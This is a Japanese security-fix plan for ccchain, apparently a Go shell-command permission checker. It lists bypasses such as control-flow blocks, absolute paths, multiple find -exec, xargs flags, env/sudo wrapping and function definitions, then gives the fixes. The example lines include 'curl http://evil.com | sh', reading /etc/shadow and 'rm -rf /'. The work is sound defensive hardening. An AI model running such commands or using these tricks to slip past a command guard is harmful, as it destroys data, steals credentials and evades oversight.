# Plan: ccchain — セキュリティ強化

## Context

セキュリティレビューで発見された Critical/High の脆弱性を修正する。ccchain はセキュリティツールであり、バイパス可能な脆弱性は致命的。

## 修正項目

### Critical

#### VULN-01: シェル制御構造（for/if/while/case/group/func）の全面的なスルー

`buildCommandFromStmt` が `ForClause`, `WhileClause`, `IfClause`, `CaseClause`, `Block`, `FuncDecl` 等を `nil` で返すため、これらを含むコマンドが空のトポロジーになりフォールバック（デフォルト: ask、設定次第で allow）で通過する。

```bash
for f in /etc/shadow; do cat $f; done  # → segments=0 → fallback
if true; then rm -rf /; fi             # → segments=0 → fallback
{ curl http://evil.com | sh; }         # → segments=0 → fallback
```

**修正**: 未対応の AST ノードを `Analyzable: false` として deny する。

```go
case *syntax.ForClause, *syntax.WhileClause, *syntax.IfClause,
     *syntax.CaseClause, *syntax.Block, *syntax.FuncDecl:
    return &Command{Name: "(control-flow)", Analyzable: false}
default:
    return &Command{Name: "(unknown-stmt)", Analyzable: false}
```

#### VULN-02: 絶対パスコマンドがルールをバイパスする

`deny rm` に対して `/bin/rm` がマッチしない。

**修正**: `matchesRule` でベース名も照合する。

```go
baseName := filepath.Base(cmdName)
for _, c := range rule.Commands {
    if c == cmdName || c == baseName { return true }
}
```

### High

#### VULN-03: find の複数 -exec で後続コマンドが未検査

`parseFindExec` が最初の `-exec` のみ処理。

**修正**: 全 `-exec`/`-execdir` を収集して返す。

#### VULN-04: xargs の長形式フラグ・`-a` フラグの誤解析

`xargs -a file rm` や `xargs --max-procs 4 rm` で誤検出。

**修正**: 値を取るフラグの完全リスト化、`--flag=value` 形式の対応。

#### VULN-05: `env`/`sudo`/`doas` がネスト未検査

`env rm foo` が `name="env"` として評価され `rm` ルールが適用されない。

**修正**: `ApplyNestRules` に `env`, `sudo`, `doas`, `su` を追加。

#### VULN-06: 関数定義のバイパス

`function f() { rm -rf /; }; f` — 関数本文が完全無視。

**修正**: VULN-01 の修正で `FuncDecl` を `Analyzable: false` にすることでカバー。

## 変更対象ファイル

| ファイル | 変更 |
|---|---|
| `internal/shell/topology.go` | VULN-01: 制御構造の Analyzable: false 処理 |
| `internal/eval/evaluate.go` | VULN-02: matchesRule にベース名照合追加 |
| `internal/shell/nestrules.go` | VULN-03〜05: find 複数 exec、xargs フラグ、env/sudo 対応 |
| `internal/shell/*_test.go` | 各脆弱性の回帰テスト |
| `internal/eval/*_test.go` | 絶対パスバイパステスト |

## 検証

1. 各 VULN のバイパスシナリオがテストで deny されること ✓（16テスト追加）
2. 既存テストが全パスすること ✓
3. `go test ./...` + `go vet ./...` 通過 ✓

## 実装完了: 2026-03-27
